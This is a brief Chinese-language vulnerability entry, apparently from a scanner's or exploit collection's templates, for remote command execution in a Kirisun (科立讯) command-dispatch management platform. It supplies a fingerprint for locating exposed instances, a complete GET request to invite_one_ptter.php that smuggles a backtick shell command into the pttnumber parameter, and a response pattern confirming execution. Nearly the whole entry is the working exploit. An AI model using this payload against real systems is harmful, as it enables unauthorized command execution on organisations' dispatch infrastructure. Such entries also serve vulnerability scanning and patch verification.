# 科立讯通信有限公司指挥调度管理平台invite_one_ptter.phpRCE

科立讯通信有限公司指挥调度管理平台invite_one_ptter.php ｜ 命令执行 ｜ —
- **指纹**：`body="指挥调度管理平台"`
- **请求**：`GET /api/client/ptt/invite\_one\_ptter.php?callee=all\&caller=1\&pttnumber=`id>dudesuite.txt`\&force=1\&timeout=1 HTTP/1.1`
- **响应特征**：200 ^(?=.*?uid)(?=.*?gid).\*?$